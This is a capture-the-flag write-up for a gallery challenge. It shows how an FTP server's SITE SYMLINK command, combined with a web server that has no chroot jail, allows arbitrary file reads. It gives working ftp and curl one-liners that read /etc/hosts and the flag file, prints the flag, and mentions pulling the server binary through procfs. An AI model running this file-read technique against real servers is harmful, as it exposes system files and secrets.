# Services

On port `60498` there is a webserver running, serving some kind of Gallery.

On port `49542` there is an FTP server running.

Uploading something on the ftp side is visible on the web gallery. The description reveals the authentication logic as well.

![](screenshots/1.png)

# FTP

The FTP server is a custom one, adhering to the ProFTPd spec. 

The `HELP` command is not implemented, but after trial and error, it can be tested what is implemented.

<http://www.proftpd.org/docs/howto/FTP.html>

<http://www.proftpd.org/docs/howto/Chroot.html>

There is a command that can make symlinks, but you can not read them as there is a chroot jail implemented on the FTP.

```
SYMLINK
Used to create a symbolic link (a.k.a. a symlink) from the source path (src) to the destination path (dest).

Example:
  SITE SYMLINK src dest
```

# Web

There is no chroot jail implemented on the webserver side, therefore the uploaded symlink can be properly read there.

```bash
ftp ftp://anonymous:anonymous@10.10.1.10:49542
quote SITE SYMLINK /etc/hosts hosts
```
```bash
curl -v --path-as-is http://10.10.1.10:60498/download/hosts
```

The `/flag` file can be read with this method easily.

```bash
echo quote SITE SYMLINK /flag.txt flag.txt | ftp ftp://anonymous:anonymous@10.10.1.10:49542 && curl http://10.10.1.10:60498/download/flag.txt
```

![](screenshots/2.png)

# Flag
`CQ24{s0_sYmPle_tr1ck_y3t_n3vEr_Di5apPo1nt5}	`

# Server
The server binary was taken from the host as well this way with the help of procfs.

[ctf-gallery](workdir/src/ctf-gallery)
